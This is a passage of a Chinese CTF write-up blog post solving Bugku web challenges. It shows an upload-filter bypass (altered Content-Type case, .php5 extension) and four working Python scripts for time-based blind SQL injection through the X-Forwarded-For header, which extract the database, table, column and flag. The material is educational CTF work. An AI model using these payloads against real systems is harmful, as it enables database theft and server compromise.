+<p>需要我们上传一个图片文件，上传php文件提示</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/80.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>用burp抓包修改文件类型为图片类型，依然上传失败</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/81.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>猜测是对文件名和文件类型都有检查，想了很久不知道怎么做</p>
+<p>看了别人的题解，发现要对Content-Type: multipart/form-data修改为Content-Type: Multipart/form-data</p>
+<p>绕过过滤，再将文件名修改为php5(php的别名)，只有这个没有被过滤，再将文件类型修改为图片类型</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/82.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>具体为什么要这么做，找了好多文章都没有解释原因，暂时当成一个技巧记下来吧</p>
+<h3 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h3><p>网址：<a href="http://120.24.86.145:8002/web15/" target="_blank" rel="noopener">http://120.24.86.145:8002/web15/</a></p>
+<p>给出了源码提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>过滤了逗号，并且是insert 注入</p>
+<p>我们先来看一下insert注入方法，没有报错，没有查询，只能延时注入</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/83.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>有延迟，可以延时注入</p>
+<p>可是过滤了逗号，就没办法用if语句了</p>
+<p>但是还有一种判断执行语句：select case when 判断条件 then 执行语句1 else 执行语句2 end</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/84.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>ok，成功延时，那么最后考虑注入的判断条件，正常来说是用substr函数一位一位的截取判断，但是我们之前实用的substr函数也都是需要用到逗号的，怎么办呢</p>
+<p>get了另外一种substr函数的使用方法：substr(database() from 1 for 1) = substr(database(),1,1)</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/85.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>接下来只需要写个脚本注入就可以了</p>
+<p>先注出数据库名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/86.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>数据名为web15</p>
+<p>注表名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">table_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'table_name:'</span>,table_name)</span><br></pre></td></tr></table></figure>
+<p>这里需要考虑一下服务器有可能自身会延迟，所以我将延迟定在3秒到4秒内</p>
+<p>结果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/87.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>表名：client_ip,flag</p>
+<p>注flag表下的列名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">column_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'column_name:'</span>,column_name)</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/88.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>列名为flag</p>
+<p>最后注出flag列下的信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">f = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br></pre></td></tr></table></figure>
+<p>最后的flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/89.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-08-06T03:45:00.809Z" itemprop="dateUpdated">2018-08-06 11:45:00</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/26423/" target="_blank" rel="external">https://Foxgrin.github.io/posts/26423/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/26423/&title=《Bugkuctf-Web(2)》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/26423/&title=《Bugkuctf-Web(2)》 — Somnus's blog&source=Bugkuctf中的Web题解(二)" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/26423/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bugkuctf-Web(2)》 — Somnus's blog&url=https://Foxgrin.github.io/posts/26423/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/26423/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/22848/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：sql约束攻击
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/38711/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：Bugkuctf-Web(1)">下一篇：Bugkuctf-Web(1)</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/26423/&title=《Bugkuctf-Web(2)》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/26423/&title=《Bugkuctf-Web(2)》 — Somnus's blog&source=Bugkuctf中的Web题解(二)" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/26423/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bugkuctf-Web(2)》 — Somnus's blog&url=https://Foxgrin.github.io/posts/26423/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/26423/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAByUlEQVR42u3aS46DMBAFQO5/aUbKKosBXrttCFJ5hSBxiixa/fG2xWv/rPM73/e/nybXkxcuLm6bu5+uI8QR/WiH86eJARcX935ugqiCqnsmARQXF/fXuAku4Z6nQbi4uG/njhU8uLi4b+EmxU81lcn3XFKr4eLiNrjVhumK64X9XVxc3CJ3b6w8ZRkLXv/sjIuLewt3rBnaiTz5/ahWw8XFXcBNyoxOg6Oa0JSrNFxc3GXc6nC0+jNJgyMKnbi4uLdwE1bngEUnhYrapri4uA9xq4EmL2bO/4holIKLi7uM20lNxg5h5NxyNoSLizuVmzREyilIIyWKmiO4uLgLuElbZFbKUv3M4UwYFxd3MXdscFINUvkwtVWr4eLiTuKObZEPUDvJzdbPuXBxcYe4ebMyiYjRKbA4bBV6Obi4uFO5/SDVGZBUXwYXF/cebo6YW9jkg5kLCS4u7gLuXlzV1kn/NS5SHFxc3AXcfHUaH53XxsXFfYo7oacy1ADNWzC4uLhPcfNBSx4XOxEUFxf3XdxqW7MayC6+i4uL+2PczqGKPA0qjE9wcXEXc2cdv6iOYPPRLC4u7p3cTsM0L2Dy41wLRym4uLjX3D8DaE3UoCYDegAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
